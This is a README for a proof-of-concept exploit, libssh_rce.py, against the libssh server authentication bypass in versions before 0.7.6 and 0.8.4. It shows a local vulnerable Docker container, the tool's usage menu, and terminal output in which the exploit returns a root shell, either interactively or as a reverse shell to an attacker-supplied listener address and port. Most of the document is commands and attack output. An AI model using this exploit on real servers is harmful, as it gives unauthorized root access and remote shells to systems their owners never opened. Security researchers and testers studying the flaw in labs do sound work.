# libssh_rce.py

## Summary

A vulnerability was found in libssh's server-side state machine before versions 0.7.6 and 0.8.4. A malicious client could create channels without first performing authentication, resulting in unauthorized access.  This PoC gives you a tty shell by abuse this vulnerability. 

## Usage

Start docker container with libssh if you want to test this locally

```sh
⬢  libssh_rce  master ⦿ docker-compose up -d
Starting libssh_rce_sshd_1 ... done
```

Verify that container is running.

```sh
⬢  libssh_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                  NAMES
350f067636e8        vulhub/libssh:0.8.1   "/bin/sh -c '/usr/sr…"   42 minutes ago      Up 14 seconds       0.0.0.0:2222->22/tcp   libssh_rce_sshd_1
```

Run ./libssh_rce.py to get the usage menu. 

```sh
⬢  libssh_rce  master ⦿ ./libssh_rce.py 

▄▄▌  ▪  ▄▄▄▄· .▄▄ · .▄▄ ·  ▄ .▄▄▄▄   ▄▄· ▄▄▄ .
██•  ██ ▐█ ▀█▪▐█ ▀. ▐█ ▀. ██▪▐█▀▄ █·▐█ ▌▪▀▄.▀·
██▪  ▐█·▐█▀▀█▄▄▀▀▀█▄▄▀▀▀█▄██▀▐█▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐█▌▐▌▐█▌██▄▪▐█▐█▄▪▐█▐█▄▪▐███▌▐▀▐█•█▌▐███▌▐█▄▄▌
.▀▀▀ ▀▀▀·▀▀▀▀  ▀▀▀▀  ▀▀▀▀ ▀▀▀ ·.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    
Usage: ./libssh_rce.py <HOST:PORT> <LHOST> <LPORT>

EXAMPLE: ./libssh_rce.py '127.0.0.1' 10.30.6.147 1337
EXAMPLE: ./libssh_rce.py '127.0.0.1' interactive
```

Run the exploit in interactive mode.

```sh
⬢  libssh_rce  master ⦿ ./libssh_rce.py 127.0.0.1:2222 interactive
# id  
uid=0(root) gid=0(root) groups=0(root)
```

Run exploit in reverse_tcp mode.

```sh
⬢  libssh_rce  master ⦿ ./libssh_rce.py '127.0.0.1:2222' 192.168.1.81 1337
[+] LHOST = 192.168.1.81
[+] LPORT = 1337
[+] Shell listen
root@350f067636e8:/# id
uid=0(root) gid=0(root) groups=0(root)
```